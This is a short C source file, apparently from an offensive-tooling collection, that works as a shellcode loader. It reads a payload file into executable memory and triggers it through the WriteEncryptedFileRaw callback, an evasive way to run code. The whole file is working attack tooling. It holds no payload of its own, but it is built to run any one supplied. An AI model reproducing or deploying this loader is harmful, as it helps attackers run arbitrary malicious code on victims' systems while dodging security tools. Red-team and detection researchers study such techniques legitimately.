// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file> <another file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	PVOID pContext = NULL;

	if (argc != 3)
	{
		printf("Usage: WriteEncryptedFileRaw.exe C:\\Path\\To\\Shellcode.bin C:\\Path\\to\\a\\file.txt");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	OpenEncryptedFileRaw(argv[2], CREATE_FOR_IMPORT, &pContext);

	WriteEncryptedFileRaw((PFE_IMPORT_FUNC)hAlloc, NULL, pContext);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (pContext)
		CloseEncryptedFileRaw(pContext);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
